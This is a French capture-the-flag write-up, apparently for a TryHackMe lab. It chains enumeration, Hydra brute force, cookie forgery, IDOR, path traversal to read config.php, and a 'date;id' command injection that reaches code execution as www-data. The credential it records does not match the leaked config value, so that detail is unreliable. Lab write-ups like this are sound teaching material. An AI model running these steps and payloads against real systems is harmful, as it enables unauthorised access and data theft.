# 1. Reconnaissance

## Scan Nmap

```bash
sudo nmap -sV -sC <TARGET_IP> -oA nmap
```

Résultat :

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Le service SSH nécessite des identifiants et ne constitue pas un point d'entrée immédiat.
L'attention se porte donc sur l'application web exposée sur le port 80.

---

# 2. Analyse de l'application web

La page d'accueil présente un portail interne nommé **Support Operations Panel**.

Le code source HTML révèle un formulaire d'authentification simple.

```html
<form method="POST">

<input type="email" name="email">
<input type="password" name="password">

Problems signing in? Contact IT Operations @ help@support.thm
```

Une adresse email interne est divulguée :

```text
help@support.thm
```

Cette information pourra être utilisée lors des futures tentatives d'authentification.

---

# 3. Énumération des ressources web

## Gobuster

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,js,bak,zip
```

Résultats :

```text
/info.php             (Status: 200)
/index.php            (Status: 200)
/footer.php           (Status: 200)

/skins                (Status: 301)
/includes             (Status: 301)
/layout               (Status: 301)
/js                   (Status: 301)

/api.php              (Status: 302)
/logout.php           (Status: 302)
/dashboard.php        (Status: 302)

/config.php           (Status: 200)

/server-status        (Status: 403)
```

## Ressources accessibles (200 OK)

```text
/info.php
/index.php
/footer.php
/config.php
```

Les fichiers les plus intéressants sont :

- `info.php` : expose une page `phpinfo()`
- `config.php` : fichier de configuration potentiellement sensible
- `index.php` : page principale de l'application

## Répertoires découverts (301)

```text
/skins/
/includes/
/layout/
/js/
```

Ces répertoires peuvent contenir :

- des composants PHP ;
- des templates HTML ;
- des fichiers JavaScript ;
- des endpoints internes.

## Pages protégées (302)

```text
/api.php
/dashboard.php
/logout.php
```

Redirection observée :

```http
HTTP/1.1 302 Found
Location: index.php
```

Cette réponse indique que :

- les ressources existent ;
- un mécanisme d'authentification est présent ;
- les utilisateurs non authentifiés sont redirigés vers la page de connexion.

## Ressource interdite (403)

```text
/server-status
```

Cette ressource correspond généralement au module Apache `mod_status`.
L'accès est correctement restreint.

---

# 4. Analyse de phpinfo()

Le fichier `info.php` expose une page `phpinfo()` complète.

Informations récupérées :

```text
DOCUMENT_ROOT = /var/www/html

session.save_path = /var/lib/php/sessions

disable_functions = no value

open_basedir = no value
```

Cette étape permet de mieux comprendre l'environnement serveur sans fournir de credentials directement exploitables.

---

# 5. Analyse des mécanismes d'authentification

Les pages sensibles sont testées directement.

```bash
curl -i http://<TARGET_IP>/dashboard.php

curl -i http://<TARGET_IP>/api.php
```

Réponse :

```http
HTTP/1.1 302 Found
Location: index.php
```

L'accès est protégé par une authentification préalable.

L'analyse de `logout.php` révèle également l'existence d'un cookie supplémentaire.

```http
Set-Cookie: isITUser=deleted
```

Ce cookie semble participer à la logique applicative.

---

# 6. Interception du formulaire avec Burp Suite

Configuration du proxy Firefox :

```text
Name : Burp
Address : 127.0.0.1
Port : 8080
```

Requête interceptée :

```http
POST / HTTP/1.1

email=pozer%40pozerze.com&password=popotertperopt
```

Observations :

- aucun token CSRF ;
- aucun paramètre caché ;
- seulement deux champs : `email` et `password`.

Une tentative invalide renvoie :

```html
<div class="alert alert-danger">
Invalid credentials
</div>
```

Ce message servira de condition d'échec pour Hydra.

---

# 7. Brute Force du compte Helpdesk

L'adresse découverte précédemment est utilisée comme nom d'utilisateur.

```bash
hydra \
-l help@support.thm \
-P /usr/share/wordlists/rockyou.txt \
<TARGET_IP> \
http-post-form \
"/:email=^USER^&password=^PASS^:Invalid credentials"
```

Résultat :

```text
login: help@support.thm
password: snoopy
```

Identifiants obtenus :

```text
help@support.thm : snoopy
```

Un accès utilisateur initial est désormais disponible.

---

# 8. Contournement du contrôle d'accès via le cookie isITUser

L'acces à endpoint api.php est refusé. Récupération des cookies.

```bash
curl -c cookies.txt \
-d "email=help@support.thm&password=snoopy" \
-X POST \
http://<TARGET_IP>/

Tentative:
curl -b cookies.txt \
http://<TARGET_IP>/api.php

Réponse:
Access denied
```

Après authentification, un cookie supplémentaire apparaît.

```text
isITUser=68934a3e9455fa72420237eb05902327
```

La longueur (32 caractères) suggère un hash MD5.

Le hash est identifié comme étant :

```text
false
```

Une hypothèse est alors formulée : l'application pourrait vérifier la valeur `true`.

```bash
echo -n "true" | md5sum

b326b5062b2f0e69046810717534cb09

Nouveau Cookie:
isITUser=b326b5062b2f0e69046810717534cb09
```

L'accès à l'API interne est désormais autorisé.

Cette vulnérabilité correspond à un **Cookie Tampering**.

---

# 9. Découverte de l'Internal User API

Une nouvelle interface apparaît.

```text
Internal User API
```

L'application fournit un indice.

```bash
As a helpdesk user, you can query your own profile:

/user/3

{
  "email":"help@support.thm",
  "2FA":false,
  "admin":false
}
```

Informations découvertes :

- existence d'une API interne ;
- divulgation d'informations sensibles ;
- utilisation d'identifiants numériques ;
- le compte Helpdesk correspond à l'utilisateur `3`.

Une vulnérabilité de type **BOLA / IDOR** est suspectée.

---

# 10. Exploitation de l'IDOR (BOLA)

L'utilisateur `1` est testé.

```bash
GET /user/1

{
  "email":"specialadmin@support.thm",
  "2FA":false,
  "admin":true
}
```

Compte administrateur découvert :

```text
specialadmin@support.thm
```

Tentatives réalisées :
### SQL Injection

```text
api.php?id=1'

Résultat:
null
```

Aucune SQL Injection exploitable.

### Ajout d'un cookie admin

```text
admin=true
```

Aucun changement observé.

---

# 11. Découverte d'une lecture arbitraire de fichiers via le paramètre `skin`

Le dashboard contient un sélecteur de thème.

L'URL observée est :

```text
dashboard.php?skin=default


Une tentative de traversée de répertoire est effectuée.


dashboard.php?skin=../dashboard
```

Le dashboard s'affiche alors une seconde fois à l'intérieur de la page.

Ce comportement suggère que le paramètre `skin` est utilisé pour charger dynamiquement des fichiers présents sur le serveur.

L'analyse du code affiché permet de comprendre le fonctionnement interne.

```php
$webRoot = realpath('/var/www/html/skins');

$requested = realpath($webRoot . '/' . $skin . '.php');

if ($requested !== false && strpos($requested, $another) === 0) {

    readfile($requested);

}
```

## Analyse du mécanisme de protection

L'application utilise la fonction PHP `realpath()`, couramment employée pour limiter les attaques de type **Local File Inclusion (LFI)** et **Path Traversal**.

Cette fonction :

- résout les séquences `.` et `..` ;
- convertit un chemin relatif en chemin absolu ;
- résout les liens symboliques ;
- vérifie que le fichier existe.

Par exemple :

```php
realpath('/var/www/html/skins/../config.php');


renvoie :


/var/www/html/config.php
```

Cependant, `realpath()` n'est pas une protection suffisante à lui seul.

La sécurité repose entièrement sur la vérification effectuée après la normalisation du chemin.

```php
strpos($requested, $another) === 0
```

La variable `$another` définit la zone autorisée.

Si cette variable correspond à un répertoire trop large, comme `/var/www/html`, il devient possible de sortir du dossier `skins` tout en restant à l'intérieur de l'application.

Le serveur n'utilise pas une inclusion PHP classique (`include()`), mais la fonction `readfile()`.

Le code PHP des fichiers ciblés n'est donc pas exécuté ; seul leur contenu est affiché.

La vulnérabilité correspond à une combinaison de :

```text
Path Traversal

↓

Arbitrary File Read
```

et non à un **LFI classique**.

---

# 12. Lecture du fichier config.php

Nouvelle requête :

```text
dashboard.php?skin=/../config
```

Le contenu du fichier est affiché.

```bash
$MASTER_PASSWORD = 'support@110';

$SITE_VER = '1.0';

$SITE_NAME = 'support_portal';
```

Credential :

```bash
specialadmin@support.thm
support110
```

---

# 13. Exploitation d'une injection de commandes (OS Command Injection)

Une fois connecté en tant qu'administrateur, un nouveau composant apparaît dans le dashboard.

```html
<form method="POST" id="sysForm">

<select name="sys"
        class="form-select"
        onchange="document.getElementById('sysForm').submit();">

    <option value="date">
        Date
    </option>

    <option value='date +"%H:%M:%S"'>
        Time
    </option>

</select>

</form>
```

La requête HTTP associée est :

```http
POST /dashboard.php HTTP/1.1

sys=date +"%H:%M:%S"
```

La réponse est ensuite affichée dans la page.

```html
<pre class="mb-0">
12:45:02
</pre>
```

Une validation côté serveur est présente.

Lorsqu'une commande autre que `date` est utilisée, le serveur renvoie :

```text
Only date command is allowed.
```

Payload :

```text
date;id
```

Résultat :

```text
Tue Jun 16 12:47:10 UTC 2026

uid=33(www-data)

gid=33(www-data)

groups=33(www-data)
```

Cette réponse confirme l'exécution de commandes arbitraires sur le serveur.

La vulnérabilité correspond à :

```text
OS Command Injection

↓

Remote Code Execution (RCE)
```

Le code est exécuté avec les privilèges du compte :

```text
www-data
```

---

# 14. Lecture du flag utilisateur

Une fois le RCE obtenu, le fichier demandé par la room peut être récupéré.

Payload :

```text
date;cat /home/ubuntu/user.txt
```

Le contenu du fichier est alors affiché dans la page.

---

# 15. Vulnérabilités identifiées

```text
Information Disclosure

↓

Weak Authentication

↓

Brute Force

↓

Cookie Tampering

↓

BOLA / IDOR

↓

Path Traversal

↓

Arbitrary File Read

↓

Credential Disclosure

↓

Admin Access

↓

OS Command Injection

↓

Remote Code Execution (RCE)
```

---